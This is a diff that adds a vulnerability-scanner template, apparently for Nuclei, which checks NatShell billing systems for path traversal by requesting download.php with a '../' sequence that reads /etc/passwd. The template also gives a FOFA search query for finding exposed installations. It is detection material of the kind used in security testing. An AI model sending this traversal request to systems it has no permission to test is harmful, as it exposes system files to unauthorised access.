@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - regex:
+            - toor:[x*]:0:0
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/download.php?file=../../../../../etc/passwd'
+id: natshell-path-traversal
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: NatShell is vulnerable to local file inclusion.
+    metadata:
+        fofa-query: title="蓝海卓越计费管理系统"
+        max-request: 1
+    name: NatShell - Local File Inclusion
+    reference:
+        - https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
+    severity: high
+    tags:
+        - natshell
+        - 蓝海卓越计费管理系统
